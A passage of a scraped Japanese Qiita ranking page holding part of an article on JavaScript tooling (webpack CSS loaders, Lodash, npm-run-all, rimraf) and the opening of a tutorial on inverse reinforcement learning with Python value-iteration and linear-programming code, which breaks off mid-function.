<span id="flow" class="fragment"></span><a href="#flow"><i class="fa fa-link"></i></a><a href="https://flow.org/" rel="nofollow noopener" target="_blank">flow</a>
</h2>

<ul>
<li>プロジェクトに気軽に型チェックを導入できる</li>
</ul>

<p><br></p>

<h1>
<span id="css関連のloader" class="fragment"></span><a href="#css%E9%96%A2%E9%80%A3%E3%81%AEloader"><i class="fa fa-link"></i></a>CSS関連のLoader</h1>

<blockquote>
<p>「どんなものでも最終的な出力をjavascriptで実行できる形に変換する」もの。</p>
</blockquote>

<p>参考<br>
<a href="https://qiita.com/shuntksh/items/bb5cbea40a343e2e791a" id="reference-574b036eeccc21c2abd0">WebpackってCSS周りのLoaderがいっぱいあって分かりにくいので整理してみる</a><br>
<a href="https://qiita.com/inuscript/items/0574ab1ef358fecb55b9" id="reference-3fd004680ffcbb827def">なんとなくで理解しないWebpackのCSS周辺</a></p>

<h2>
<span id="css-loader" class="fragment"></span><a href="#css-loader"><i class="fa fa-link"></i></a><a href="https://github.com/webpack-contrib/css-loader" rel="nofollow noopener" target="_blank">css-loader</a>
</h2>

<ul>
<li>CSSの依存関係を解決し、JSで読み込めるようにする</li>
<li>
<code>@import</code>と<code>url()</code>で管理する</li>
</ul>

<h2>
<span id="raw-loader" class="fragment"></span><a href="#raw-loader"><i class="fa fa-link"></i></a><a href="https://qiita.com/inuscript/items/0574ab1ef358fecb55b9">raw-loader</a>
</h2>

<ul>
<li>cssをJSで読み込めるようにする</li>
<li>css-loaderのように高機能ではない。超シンプル</li>
</ul>

<h2>
<span id="style-loader" class="fragment"></span><a href="#style-loader"><i class="fa fa-link"></i></a><a href="https://github.com/webpack-contrib/style-loader" rel="nofollow noopener" target="_blank">style-loader</a>
</h2>

<ul>
<li>DOMに <code>&lt;style&gt;</code>タグを挿入し、CSSを読み込ませる</li>
<li>要するにHTMLにCSSを挿入する</li>
</ul>

<h2>
<span id="less-loader" class="fragment"></span><a href="#less-loader"><i class="fa fa-link"></i></a><a href="https://github.com/webpack-contrib/less-loader" rel="nofollow noopener" target="_blank">less-loader</a>
</h2>

<ul>
<li>
<a href="http://lesscss.org/3.x/" rel="nofollow noopener" target="_blank">Less</a>(CSSを記述するためのDSL)をCSSに変換するためのLoader</li>
<li>実際に使うときは、その上に<code>css-loader</code>, <code>style-loader</code>を載せる</li>
</ul>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="nx">require</span><span class="p">(</span><span class="s2">"!style!css!less!./file.less"</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="postcss-loader" class="fragment"></span><a href="#postcss-loader"><i class="fa fa-link"></i></a><a href="https://github.com/postcss/postcss-loader" rel="nofollow noopener" target="_blank">Postcss-loader</a>
</h2>

<ul>
<li>
<a href="http://postcss.org/" rel="nofollow noopener" target="_blank">PostCSS</a>(JSでつくられたCSS変換ツール)でCSSを処理するLoader</li>
</ul>

<p><br></p>

<h1>
<span id="その他ライブラリ" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>その他ライブラリ</h1>

<h2>
<span id="promiseライブラリ" class="fragment"></span><a href="#promise%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a><a href="https://developers.google.com/web/fundamentals/primers/promises?hl=ja" rel="nofollow noopener" target="_blank">Promise</a>ライブラリ</h2>

<ul>
<li>非同期処理を抽象化したオブジェクトとして扱う</li>
<li>callbackでもできるが、ルールが統一されたため</li>
<li>非同期処理をキューにして管理することができる</li>
</ul>

<h3>
<span id="bluebird" class="fragment"></span><a href="#bluebird"><i class="fa fa-link"></i></a><a href="https://github.com/petkaantonov/bluebird" rel="nofollow noopener" target="_blank">Bluebird</a>
</h3>

<ul>
<li><a href="https://qiita.com/masakielastic/items/025b67d01b3501a5c3fb" id="reference-b521c20ee2964cb406e8">Bluebird で Promise を学ぶ</a></li>
</ul>

<h2>
<span id="ユーティリティライブラリ" class="fragment"></span><a href="#%E3%83%A6%E3%83%BC%E3%83%86%E3%82%A3%E3%83%AA%E3%83%86%E3%82%A3%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>ユーティリティライブラリ</h2>

<ul>
<li>ネイティブ型を扱うライブラリ</li>
<li>ES2015以降でサポートされている記法もある</li>
<li>基本的にはどちらか一方を利用する</li>
</ul>

<h3>
<span id="underscore" class="fragment"></span><a href="#underscore"><i class="fa fa-link"></i></a><a href="http://underscorejs.org/" rel="nofollow noopener" target="_blank">Underscore</a>
</h3>

<ul>
<li>100以上の関数が定義されている(map, filter...)</li>
<li>公式ページが分かりやすい</li>
</ul>

<h3>
<span id="lodash" class="fragment"></span><a href="#lodash"><i class="fa fa-link"></i></a><a href="https://lodash.com/" rel="nofollow noopener" target="_blank">Lodash</a>
</h3>

<ul>
<li>UnderscoreからForkされたプロジェクト</li>
<li>Underscoreよりもパフォーマンスがよいらしい</li>
<li><a href="https://lodash.com/custom-builds" rel="nofollow noopener" target="_blank">カスタムビルドができる</a></li>
</ul>

<h2>
<span id="時間操作ライブラリ" class="fragment"></span><a href="#%E6%99%82%E9%96%93%E6%93%8D%E4%BD%9C%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>時間操作ライブラリ</h2>

<h3>
<span id="momentjs" class="fragment"></span><a href="#momentjs"><i class="fa fa-link"></i></a><a href="http://momentjs.com/" rel="nofollow noopener" target="_blank">Moment.js</a>
</h3>

<ul>
<li>タイムゾーンの設定</li>
<li>フォーマットの指定</li>
<li>日時計算</li>
</ul>

<p><br></p>

<h1>
<span id="開発に便利なライブラリ" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%81%AB%E4%BE%BF%E5%88%A9%E3%81%AA%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>開発に便利なライブラリ</h1>

<h2>
<span id="npm-run-all" class="fragment"></span><a href="#npm-run-all"><i class="fa fa-link"></i></a><a href="https://www.npmjs.com/package/npm-run-all" rel="nofollow noopener" target="_blank">npm-run-all</a>
</h2>

<ul>
<li>並行でのnpmコマンド実行や、npmコマンドの単純化ができる</li>
<li>以下の3つのコマンドが用意される

<ul>
<li>
<code>run-s</code> : sequentialに実行</li>
<li>
<code>run-p</code> : parallelで実行</li>
<li>
<code>npm-run-all</code> : どちらも指定できる。デフォルトは<code>sequential</code>
</li>
</ul>
</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ npm run clean &amp;&amp; npm run build:css &amp;&amp; npm run build:js &amp;&amp; npm run build:html
↓ 簡潔に実行できる
$ npm-run-all clean build:* 
</pre></div></div>

<h2>
<span id="rimraf" class="fragment"></span><a href="#rimraf"><i class="fa fa-link"></i></a><a href="https://www.npmjs.com/package/rimraf" rel="nofollow noopener" target="_blank">rimraf</a>
</h2>

<ul>
<li>
<code>rm -rf</code>を実行できる</li>
<li>
<code>npm run clean</code> で使うことが多い</li>
</ul>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>  <span class="s2">"scripts"</span><span class="o">:</span> <span class="p">{</span>
    <span class="s2">"clean"</span><span class="o">:</span> <span class="s2">"rimraf targetDir"</span>
  <span class="p">}</span>
</pre></div></div>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p><a href="/erukiti" class="user-mention js-hovercard" title="erukiti" data-hovercard-target-type="user" data-hovercard-target-name="erukiti">@erukiti</a> さんのご指摘により大幅に修正 <a href="#fnref1">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">85位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>107</kbd>
		<a target="_blank" href="https://qiita.com/neka-nat@github/items/aaab6184aea7d285b103">逆強化学習を理解する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-06<br />01:20:12</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/14516.html">neka-nat@github</a>(21件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/14516/profile-images/1509901398">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[MachineLearning]</b> <b>[DeepLearning]</b> <b>[強化学習]</b> <b>[逆強化学習]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="逆強化学習" class="fragment"></span><a href="#%E9%80%86%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>逆強化学習</h1>

<p>一般的な強化学習では、エージェントが環境からの報酬を得ることで最適な行動を獲得します。しかし現実の問題においては、この報酬を設計することが困難な場合があります。<br>
例えば運転技術を獲得する場合、うまい運転というのはただ目的地に速く着くだけでなく、急発進・急ブレーキしない、混んでなさそうな道を選ぶなど実際の報酬関数として考慮しづらい要素が存在します。  <strong>逆強化学習ではエキスパートによる行動から報酬を推定する</strong> ことによって、このような表現しにくい報酬を求めることができます。</p>

<p><a href="https://camo.qiitausercontent.com/e15fb9b8d74b541ab616ef7023f8da60c38e6078/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f31323430613533662d316463612d626334632d653433332d3464363031653866356435372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e15fb9b8d74b541ab616ef7023f8da60c38e6078/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f31323430613533662d316463612d626334632d653433332d3464363031653866356435372e706e67" alt="逆強化学習.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/1240a53f-1dca-bc4c-e433-4d601e8f5d57.png"></a></p>

<h2>
<span id="逆強化学習の手法" class="fragment"></span><a href="#%E9%80%86%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92%E3%81%AE%E6%89%8B%E6%B3%95"><i class="fa fa-link"></i></a>逆強化学習の手法</h2>

<p>この記事では逆強化学習の手法としてよく取り上げられる手法の中で以下の3つについて解説したいと思います。</p>

<ul>
<li>線形計画法を用いた逆強化学習</li>
<li>Maximum Entropy IRL</li>
<li>Maximum Entropy Deep IRL</li>
</ul>

<h2>
<span id="マルコフ決定過程mdp" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%82%B3%E3%83%95%E6%B1%BA%E5%AE%9A%E9%81%8E%E7%A8%8Bmdp"><i class="fa fa-link"></i></a>マルコフ決定過程(MDP)</h2>

<p>逆強化学習に入る前にまずMDPについて説明します。<br>
マルコフ決定過程は簡単には $(S, A, T, R)$ の組みからなる確率的な過程を示します。</p>

<ul>
<li>$S(=1,2,...,M) $ : 有限状態空間</li>
<li>$A$ : 状態$i \in S $でとり得るアクションの有限集合</li>
<li>$T$ : 状態$i$で行動$a \in A $をとったとき、つぎの時刻で状態$j \in S $に遷移する確率</li>
<li>$R$ : 状態$i$で行動$a$をとったときの期待即時コスト</li>
</ul>

<p>今回はMDPとしてよく使われるGrid Worldを環境として使用します。OpenAI Gymを使ったものがすでに存在するので<a href="https://github.com/dennybritz/reinforcement-learning/blob/master/lib/envs/gridworld.py" rel="nofollow noopener" target="_blank">これ</a>を使います。<br>
インポートして実行すると以下のように動きます。実行結果のxがエージェントの現在位置を示しています。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">gridworld</span>
<span class="n">env</span> <span class="o">=</span> <span class="n">gridworld</span><span class="o">.</span><span class="n">GridworldEnv</span><span class="p">()</span>
<span class="n">env</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
<span class="n">env</span><span class="o">.</span><span class="n">step</span><span class="p">(</span><span class="n">gridworld</span><span class="o">.</span><span class="n">UP</span><span class="p">)</span>
<span class="n">env</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
<span class="n">env</span><span class="o">.</span><span class="n">step</span><span class="p">(</span><span class="n">gridworld</span><span class="o">.</span><span class="n">LEFT</span><span class="p">)</span>
<span class="n">env</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
</pre></div></div>

<p>実行結果</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>T  o  o  o
o  o  o  o
o  x  o  o
o  o  o  T

T  o  o  o
o  x  o  o
o  o  o  o
o  o  o  T

T  o  o  o
x  o  o  o
o  o  o  o
o  o  o  T
</pre></div></div>

<p>また報酬のマップは以下のようになります。赤が報酬が高い、青が報酬が低いところです。</p>

<p><a href="https://camo.qiitausercontent.com/367f0adb76659519a4a9acb3393a77997f1302b0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f62373931376433612d303134352d366633642d663830642d6132613933613866646437332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/367f0adb76659519a4a9acb3393a77997f1302b0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f62373931376433612d303134352d366633642d663830642d6132613933613866646437332e706e67" alt="ground_truth.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/b7917d3a-0145-6f3d-f80d-a2a93a8fdd73.png"></a></p>

<h2>
<span id="価値反復法" class="fragment"></span><a href="#%E4%BE%A1%E5%80%A4%E5%8F%8D%E5%BE%A9%E6%B3%95"><i class="fa fa-link"></i></a>価値反復法</h2>

<p>MDPにおいて最適な価値関数$V^*(s)$を求めるベルマンの最適方程式は以下のように書けます。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>V^*(s)=\max_a \Bigl( R(s,a) + \gamma \sum_{s'} P(s'|s,a)V^*(s') \Bigr)
</pre></div></div>

<p>今回は報酬関数を状態のみの関数にしようと思っているので、以下のように$\max$が後ろの項にのみかかります。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>V^*(s)= R(s) + \gamma \max_a \Bigl( \sum_{s'} P(s'|s,a)V^*(s') \Bigr)
</pre></div></div>

<p>この式を上で作成したGrid環境に適応し、全状態の最適な価値を求められる関数は以下のようになります。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">value_iteration</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">reward</span><span class="p">,</span> <span class="n">gamma</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span> <span class="n">epsilon</span><span class="o">=</span><span class="mf">0.001</span><span class="p">):</span>
    <span class="sd">"""Solving an MDP by value iteration."""</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">U1</span> <span class="o">=</span> <span class="p">{</span><span class="n">s</span><span class="p">:</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">)}</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">U</span> <span class="o">=</span> <span class="n">U1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">):</span>
            <span class="n">Rs</span> <span class="o">=</span> <span class="n">reward</span><span class="p">[</span><span class="n">s</span><span class="p">]</span>
            <span class="n">U1</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">=</span> <span class="n">Rs</span> <span class="o">+</span> <span class="n">gamma</span> <span class="o">*</span> <span class="nb">max</span><span class="p">([</span><span class="nb">sum</span><span class="p">([</span><span class="n">p</span> <span class="o">*</span> <span class="n">U</span><span class="p">[</span><span class="n">s1</span><span class="p">]</span> <span class="k">for</span> <span class="n">s1</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">[</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="p">:])])</span>
                                      <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_actions</span><span class="p">)])</span>
            <span class="n">delta</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">delta</span><span class="p">,</span> <span class="nb">abs</span><span class="p">(</span><span class="n">U1</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">-</span> <span class="n">U</span><span class="p">[</span><span class="n">s</span><span class="p">]))</span>
        <span class="k">if</span> <span class="n">delta</span> <span class="o">&lt;</span> <span class="n">epsilon</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">gamma</span><span class="p">)</span> <span class="o">/</span> <span class="n">gamma</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">U</span>
</pre></div></div>

<p>この関数を用いて、各状態での価値を描画したものが下図になります。</p>

<p><a href="https://camo.qiitausercontent.com/ee0584dcc0d4af09edb146fe357fe0939fbbbbe0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f35326261643636622d666362332d663361332d633935662d3833323035373330303965302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ee0584dcc0d4af09edb146fe357fe0939fbbbbe0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f35326261643636622d666362332d663361332d633935662d3833323035373330303965302e706e67" alt="value_map.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/52bad66b-fcb3-f3a3-c95f-8320573009e0.png"></a></p>

<p>次に求めた価値関数から最適な方策を求めます。最適な価値$V^*$を用いて求める方策の式は以下のようになります。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>\pi (s) = arg \max_{a \in A} \sum_{s'} P(s'|s,a)V^*(s')
</pre></div></div>

<p>コードは以下のようになります。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">expected_utility</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">U</span><span class="p">,</span> <span class="n">trans_probs</span><span class="p">):</span>
    <span class="sd">"""The expected utility of doing a in state s, according to the MDP and U."""</span>
    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">p</span> <span class="o">*</span> <span class="n">U</span><span class="p">[</span><span class="n">s1</span><span class="p">]</span> <span class="k">for</span> <span class="n">s1</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">[</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="p">:])])</span>

<span class="k">def</span> <span class="nf">best_policy</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">U</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    Given an MDP and a utility function U, determine the best policy,</span>
<span class="sd">    as a mapping from state to action.</span>
<span class="sd">    """</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">pi</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">):</span>
        <span class="n">pi</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">n_actions</span><span class="p">),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">expected_utility</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">U</span><span class="p">,</span> <span class="n">trans_probs</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">pi</span>
</pre></div></div>

<p>これを用いて実際に各状態での最適な方策を描画したものが下図になります。ゴールの矢印は初期値のままなので無視してもらって、それ以外は実際にゴールに向かうように矢印が流れているのが分かると思います。</p>

<p><a href="https://camo.qiitausercontent.com/5afce31be254fcfae4b753dd5b3875b5ac3700e8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f66303131656233662d346434342d326162652d616661352d6266356162656232383033612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5afce31be254fcfae4b753dd5b3875b5ac3700e8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f66303131656233662d346434342d326162652d616661352d6266356162656232383033612e706e67" alt="pi_map.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/f011eb3f-4d44-2abe-afa5-bf5abeb2803a.png"></a></p>

<h2>
<span id="線形計画法を用いた逆強化学習" class="fragment"></span><a href="#%E7%B7%9A%E5%BD%A2%E8%A8%88%E7%94%BB%E6%B3%95%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E9%80%86%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>線形計画法を用いた逆強化学習</h2>

<p>まず最初に<a href="http://ai.stanford.edu/%7Eang/papers/icml00-irl.pdf" rel="nofollow noopener" target="_blank">Ngらによる線形計画法を用いた逆強化学習</a>について説明します。<br>
ここでは逆強化学習では各状態$s_i(i=1,2,...,M)$における最適な行動$a_1$(上で計算した方策)が既知であるとします。このとき各状態における報酬を表したベクトル$R$を求めます。これは以下のような最適化を解く問題になります。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>maximize: \sum_{i \in S} \min_{a \in A \setminus a_1} \Bigl\{ \bigl(P_{a_1}(i) - P_a(i) \bigr) {\bigl(I - \gamma P_{a_1}(i) \bigr)}^{-1} R \Bigr\} - \lambda ||R||_1 \\

subject: \bigl(P_{a_1}(i) - P_a(i) \bigr) {\bigl(I - \gamma P_{a_1}(i) \bigr)}^{-1} R \geq 0 \\
|R_i| \leq R_{max}
</pre></div></div>

<p>この式の意味について少し考えてみます。<br>
この式の中で重要なのは$\bigl(P_{a_1}(i) - P_a(i) \bigr) {\bigl(I - \gamma P_{a_1}(i) \bigr)}^{-1} R$の部分になります。<br>
これは最適な行動$a_1$とそれ以外の行動の期待報酬の差を求めています。つまりこの <strong>目的関数は$a_1$との期待報酬の差が最も小さい行動(2番めに良い行動)との期待報酬の差を最も大きくするような報酬ベクトル</strong> を求めていることになります。<br>
上の式はこの状態では線形計画問題として扱うことができないので、新たに$t_i, u_i$という変数を用意し以下のように変換します。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>maximize: \sum_{i \in S} \bigl\{ t_i - \lambda u_i \bigr\} \\
subject: \bigl(P_{a_1}(i) - P_a(i) \bigr) {\bigl(I - \gamma P_{a_1}(i) \bigr)}^{-1} R \geq t_i \\
\bigl(P_{a_1}(i) - P_a(i) \bigr) {\bigl(I - \gamma P_{a_1}(i) \bigr)}^{-1} R \geq 0 \\
-u \leq R \leq u \\
|R_i| \leq R_{max}
</pre></div></div>

<p>これをコード化してみます。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
<span class="kn">from</span> <span class="nn">scipy.optimize</span> <span class="kn">import</span> <span class="n">linprog</span>

<span class="k">def</span> <span class="nf">lp_irl</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">policy</span><span class="p">,</span> <span class="n">gamma</span><span class="o">=</span><span class="mf">0.2</span><span class="p">,</span> <span class="n">l1</span><span class="o">=</span><span class="mf">1.5</span><span class="p">,</span> <span class="n">Rmax</span><span class="o">=</span><span class="mf">5.0</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    Solve Linear programming for Inverse Reinforcement Learning</span>
<span class="sd">    """</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">A</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">n_actions</span><span class="p">))</span>
    <span class="n">tp</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">ones_s</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">(</span><span class="n">n_states</span><span class="p">)</span>
    <span class="n">eye_ss</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">eye</span><span class="p">(</span><span class="n">n_states</span><span class="p">)</span>
    <span class="n">zero_s</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">n_states</span><span class="p">)</span>
    <span class="n">zero_ss</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">n_states</span><span class="p">,</span> <span class="n">n_states</span><span class="p">))</span>
    <span class="n">T</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="n">np</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">tp</span><span class="p">[</span><span class="n">policy</span><span class="p">[</span><span class="n">s</span><span class="p">],</span> <span class="n">s</span><span class="p">]</span> <span class="o">-</span> <span class="n">tp</span><span class="p">[</span><span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">],</span> <span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">inv</span><span class="p">(</span><span class="n">eye_ss</span> <span class="o">-</span> <span class="n">gamma</span> <span class="o">*</span> <span class="n">tp</span><span class="p">[</span><span class="n">policy</span><span class="p">[</span><span class="n">s</span><span class="p">]]))</span>

    <span class="n">c</span> <span class="o">=</span> <span class="o">-</span><span class="n">np</span><span class="o">.</span><span class="n">r_</span><span class="p">[</span><span class="n">zero_s</span><span class="p">,</span> <span class="n">ones_s</span><span class="p">,</span> <span class="o">-</span><span class="n">l1</span> <span class="o">*</span> <span class="n">ones_s</span><span class="p">]</span>
    <span class="n">zero_stack</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">n_states</span> <span class="o">*</span> <span class="p">(</span><span class="n">n_actions</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">n_states</span><span class="p">))</span>
    <span class="n">T_stack</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">vstack</span><span class="p">([</span><span class="o">-</span><span class="n">T</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">A</span> <span class="o">-</span> <span class="p">{</span><span class="n">policy</span><span class="p">[</span><span class="n">s</span><span class="p">]}])</span>
    <span class="n">I_stack</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">vstack</span><span class="p">([</span><span class="n">np</span><span class="o">.</span><span class="n">eye</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n_states</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">A</span> <span class="o">-</span> <span class="p">{</span><span class="n">policy</span><span class="p">[</span><span class="n">s</span><span class="p">]}])</span>

    <span class="n">A_ub</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">bmat</span><span class="p">([[</span><span class="n">T_stack</span><span class="p">,</span> <span class="n">I_stack</span><span class="p">,</span> <span class="n">zero_stack</span><span class="p">],</span>    <span class="c1"># -TR &lt;= t</span>
                    <span class="p">[</span><span class="n">T_stack</span><span class="p">,</span> <span class="n">zero_stack</span><span class="p">,</span> <span class="n">zero_stack</span><span class="p">],</span> <span class="c1"># -TR &lt;= 0</span>
                    <span class="p">[</span><span class="o">-</span><span class="n">eye_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">,</span> <span class="o">-</span><span class="n">eye_ss</span><span class="p">],</span>  <span class="c1"># -R &lt;= u</span>
